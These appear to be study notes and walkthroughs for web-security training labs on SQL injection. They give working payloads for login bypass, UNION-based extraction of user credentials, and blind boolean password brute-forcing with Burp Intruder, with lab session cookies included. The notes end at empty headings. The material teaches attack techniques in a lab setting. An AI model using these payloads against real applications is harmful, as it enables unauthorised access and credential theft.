### How to detect SQL injection vulnerabilities
You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:
- The single quote character ' and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

### SQL injection in different parts of the query
Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query. Most experienced testers are familiar with this type of SQL injection.
However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:
- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.

### APPRENTICE Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Lab description:
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
```bash
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products

Solution:
In the req:
```bash
GET /filter?category=Clothing%2c+shoes+and+accessories HTTP/1.1
```
Let's change to:
```bash
GET /filter?category=' HTTP/2
```
In the response we see:
```bash
HTTP/2 500 Internal Server Error
```
Since the initial query was:
```bash
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
All we need to do is:
```bash
GET /filter?category='+OR+1=1-- HTTP/2
```
And we see unreleased products and the lab is solved

### APPRENTICE Lab: SQL injection vulnerability allowing login bypass
Lab description:
This lab contains a SQL injection vulnerability in the login function
To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 

Lab solution:
In the 
```bash
POST /login HTTP/2
```
Send the following req.body:
```bash
csrf=WWNyDNOK9FfszjpIYXaJ7F2zDAg46ycW&username=administrator%27--&password=fff
```

### SQL injection UNION attacks
For a UNION query to work, two key requirements must be met:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

### Determining the number of columns required
When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the WHERE clause of the original query, you would submit: 

```bash
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as: 
```bash
The ORDER BY position number 3 is out of range of the number of items in the select list.
```
The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values: 
```bash
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
If the number of nulls does not match the number of columns, the database returns an error, such as: 
```bash
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```
We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

As with the ORDER BY technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective. 

### PRACTITIONER Lab: SQL injection UNION attack, determining the number of columns returned by the query
Lab description:
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 

Lab solution:
We see the req:
```bash
GET /filter?category=Accessories HTTP/2
```
WE modify:
```bash
GET /filter?category=Accessories' HTTP/2
```
We see internal server err in the response

Example of a UNION query:
```bash
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

So we try:
```bash
GET /filter?category=Accessories'+UNION+SELECT+null,null,null--+ HTTP/2
```
And the lab is solved, and we know that the query returns 3 columns

### Database-specific syntax
On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like: 
```bash
' UNION SELECT NULL FROM DUAL--
```
**On MySQL, the double-dash sequence must be followed by a space**

### Finding columns with a useful data type
### PRACTITIONER Lab: SQL injection UNION attack, finding a column containing text
Lab description:
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

Inside the lab (in the header we see):
Make the database retrieve the string: 'KPQOdD'

Lab solution:
First we determine the number of columns returned:
```bash
GET /filter?category=Accessories'+UNION+SELECT+null,null,null--+ HTTP/2
```
Then we determine which one of them is a string:
```bash
GET /filter?category=Accessories'+UNION+SELECT+null,'KPQOdD',null--+ HTTP/2
```
The second column is a string because the 200 response is returned and it contains the 'KPQOdD'

### PRACTITIONER Lab: SQL injection UNION attack, retrieving data from other tables
Lab desc:
The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

Lab solution:
First figure out num of columns:
```bash
GET /filter?category=Clothing'+UNION+SELECT+null,null--+ HTTP/2
```
Now we try to figure out data types:
```bash
GET /filter?category=Clothing'+UNION+SELECT+'ff','bb'--+ HTTP/2
```
It returns 200

Now we try to get data from another table:
```bash
GET /filter?category=Clothing'+UNION+SELECT+username,password+FROM+users+--+ HTTP/2
```
In the result we see 
```bash
<th>administrator</th>
<td>w05n413rr5hzxiblshpm</td>
```
So we login as admin and The lab is solved

### Retrieving multiple values within a single column
### PRACTITIONER Lab: SQL injection UNION attack, retrieving multiple values in a single column
Lab desc:
The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

Lab solution:
So we first try:
```bash
GET /filter?category=Accessories'+UNION+SELECT+null+--+ HTTP/2
```
But internal server err is returned
So we try:
```bash
GET /filter?category=Accessories'+UNION+SELECT+null,null+--+ HTTP/2
```
And 200 OK returned

> Note:
>
> If Accessories'+UNION+SELECT+null,null,null,null+--+ still returns 500 err, try to add `FROM DUAL` since the db might be oracle

So we figure out column types:
```bash
GET /filter?category=Accessories'+UNION+SELECT+null,'f'+--+ HTTP/2
```
returns OK

So we try to concatinate:

> String concatenation
> 
> You can concatenate together multiple strings to make a single string.  
> Oracle 	'foo'||'bar'   
> Microsoft 	'foo'+'bar'   
> PostgreSQL 	'foo'||'bar'   
> MySQL 	'foo' 'bar' [Note the space between the two strings]    
> CONCAT('foo','bar')    

So we send:
```bash
GET /filter?category=Accessories'+UNION+SELECT+null,username||password+FROM+users+--+ HTTP/2
```
Got 200 OK and:
```bash
<th>administrator9n01fqnojek3hh7h7ye0</th>
```

### Blind SQL injection vulnerabilities
### Exploiting blind SQL injection by triggering conditional responses

### PRACTITIONER Lab: Blind SQL injection with conditional responses
Lab desc:
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user. 

Lab solution:
First we try:
```bash
GET /filter?category=Clothing HTTP/2
Host: 0af500ac047bee12c6db55d2002c0066.web-security-academy.net
Cookie: TrackingId=y9SG8qUZ94UcRjq8'+AND+1%3d2+--+; session=PO9Sz8lCW2tCXFTpYX5Vkzb3Sw8jz94U
```
And we see that in the response html page there's no `welcome back` message
But if we change it to `AND 1=1 -- `:
```bash
Cookie: TrackingId=y9SG8qUZ94UcRjq8'+AND+1%3d1+--+; session=PO9Sz8lCW2tCXFTpYX5Vkzb3Sw8jz94U
```
Then the response html contains `welcome back message`

Now we want to make sure `users` table exists, so we do:
```bash
Cookie: TrackingId=y9SG8qUZ94UcRjq8'+AND+(SELECT+'x'+FROM+users+LIMIT+1)%3d'x'+--+; session=PO9Sz8lCW2tCXFTpYX5Vkzb3Sw8jz94U
```
And we got back `welcome back` msg in the response which means users table exists
Note: 'x' is a random value, i.e. it can be anything we want.
When the `SELECT+'x'+FROM+users` query is run, the db returns `'x'` for every row in the table

Then we make sure `administrator` user exists:
```bash
Cookie: TrackingId=KvgNSrZlU3Ydvvsv'+AND+(SELECT+'x'+FROM+users+WHERE+username%3d'administrator')%3d'x'+--+; ; session=wM4Ky23YTOvZqp5lv0dRD6qU49exoNEC
```
We got a response with `welcome` so the admin exists

Now we determine the length of admin's password:
```bash
Cookie: TrackingId=KvgNSrZlU3Ydvvsv'+AND+(SELECT+'x'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>19)%3d'x'+--+; ; session=wM4Ky23YTOvZqp5lv0dRD6qU49exoNEC
```
The password length is 20 chars

So let's now figure out the first char of admin's password.
First we try:
```bash
Cookie: TrackingId=KvgNSrZlU3Ydvvsv'+AND+(SELECT+SUBSTRING('abc',1,1)+FROM+users+WHERE+username%3d'administrator')%3d'a'+--+; ; session=wM4Ky23YTOvZqp5lv0dRD6qU49exoNEC
```
And the response contains `welcome` which means the query worked successfully

To figure out the first letter we send to Intruder:
```bash
Cookie: TrackingId=KvgNSrZlU3Ydvvsv'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username%3d'administrator')%3d'a'+--+; ; session=wM4Ky23YTOvZqp5lv0dRD6qU49exoNEC
```
And in payload we select `Brute forcer` for all alphanumerical chars
**don't forget to set min length and max length to 1**

And based on the response length we see the first letter is `q`
To check the second char:
```bash
Cookie: TrackingId=KvgNSrZlU3Ydvvsv'+AND+(SELECT+SUBSTRING(password,2,1)+FROM+users+WHERE+username%3d'administrator')%3d'a'+--+; ; session=wM4Ky23YTOvZqp5lv0dRD6qU49exoNEC
```
And the second letter is `b`

To figure out all the characters we can use Intruder's cluster bomb attack type
```bash
Cookie: TrackingId=KvgNSrZlU3Ydvvsv'+AND+(SELECT+SUBSTRING(password,$1$,1)+FROM+users+WHERE+username%3d'administrator')%3d'$a$'+--+; ; session=wM4Ky23YTOvZqp5lv0dRD6qU49exoNEC
```
And after running cluster bomb we see:
payload `1`, payload `q`,length 15805 
payload `2`, payload `b`,length 15805 
...

length 15805 includes `welcome` msg in the response
So based on that we can find figure out the whole passsword

### Error-based SQL injection
### Exploiting blind SQL injection by triggering conditional errors
### PRACTITIONER Lab: Blind SQL injection with conditional errors

